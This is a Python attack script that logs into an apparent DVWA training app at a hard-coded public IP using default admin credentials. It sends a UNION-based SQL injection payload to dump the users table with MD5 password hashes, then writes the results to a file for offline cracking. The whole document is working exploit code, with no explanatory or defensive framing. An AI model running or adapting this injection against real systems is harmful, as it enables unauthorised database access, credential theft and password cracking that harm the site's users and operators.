
import requests
import re
from urllib.parse import quote

session = requests.Session()

# Get fresh token and login
resp = session.get("http://31.97.117.123/login.php")
match = re.search(r"user_token['\"] value=['\"](.*?)['\"]", resp.text)
token = match.group(1) if match else "574fcd28f93f57c93cb554ecaf3ca520"

# Login
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}

resp = session.post("http://31.97.117.123/login.php", data=login_data)

# Extract all the data we need
payload = "999' UNION SELECT user_id, CONCAT(user, '|', first_name, '|', last_name, '|', password) FROM users-- -"
resp = session.get(f"http://31.97.117.123/vulnerabilities/sqli/?id={quote(payload)}&Submit=Submit")

# Extract the data from response
pattern = r'First name: (\d+)<br />Surname: ([^<]+)<'
matches = re.findall(pattern, resp.text)

users_data = []
for user_id, data in matches:
    parts = data.split('|')
    if len(parts) == 4:
        username, first_name, last_name, password_hash = parts
        users_data.append({
            'id': user_id,
            'username': username,
            'first_name': first_name,
            'last_name': last_name,
            'password_hash': password_hash
        })

print("\n" + "="*120)
print("COMPLETE USERS TABLE EXTRACT FROM DATABASE")
print("="*120)
print(f"\n{'ID':<5} {'Username':<15} {'First Name':<15} {'Last Name':<15} {'Password Hash (MD5)':<50}")
print("-"*120)

for user in users_data:
    print(f"{user['id']:<5} {user['username']:<15} {user['first_name']:<15} {user['last_name']:<15} {user['password_hash']:<50}")

print("\n" + "="*120)
print("SUMMARY REPORT")
print("="*120)
print(f"Total Users Extracted: {len(users_data)}")
print(f"\nVulnerability Used: SQL Injection (UNION-based)")
print(f"Authentication Credentials: admin:password")
print(f"Vulnerable Endpoint: /vulnerabilities/sqli/")

print("\n" + "="*120)
print("PASSWORD HASHES IDENTIFIED (MD5 Format)")
print("="*120)

hashes = set()
for user in users_data:
    hashes.add(user['password_hash'])
    print(f"{user['username']:<15} -> {user['password_hash']}")

print(f"\nUnique Hashes: {len(hashes)}")

# Save to file for offline cracking
with open('/tmp/extracted_users.txt', 'w') as f:
    f.write("USERNAME:PASSWORD_HASH:FIRST_NAME:LAST_NAME\n")
    for user in users_data:
        f.write(f"{user['username']}:{user['password_hash']}:{user['first_name']}:{user['last_name']}\n")

print("\n[+] Data saved to /tmp/extracted_users.txt")

